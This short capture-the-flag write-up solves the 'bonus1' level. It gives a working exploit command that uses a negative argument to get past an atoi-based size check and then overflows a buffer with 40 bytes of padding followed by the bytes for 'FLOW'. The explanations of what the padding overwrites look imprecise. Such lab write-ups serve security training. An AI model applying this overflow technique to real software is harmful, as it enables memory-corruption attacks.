## BONUS 1 HELP

the bonus 1 binary make an atoi call to the the first argv input.

### USAGE

```bash
./bonus1 [input]
```

### SOLUTION

``` bash
./bonus1 -2147483603 $(python -c 'print("a"*40 + "\x46\x4c\x4f\x57")')
```

### COMMAND EXPLANATION
- `-2147483603` : this value will be overflowed when passed to atoi, bypassing the check in the code.
- `a*40` : padding to reach the return address
- `\x46\x4c\x4f\x57` : this is the little-endian representation of the string "FLOW", which is the secret password needed to pass the level.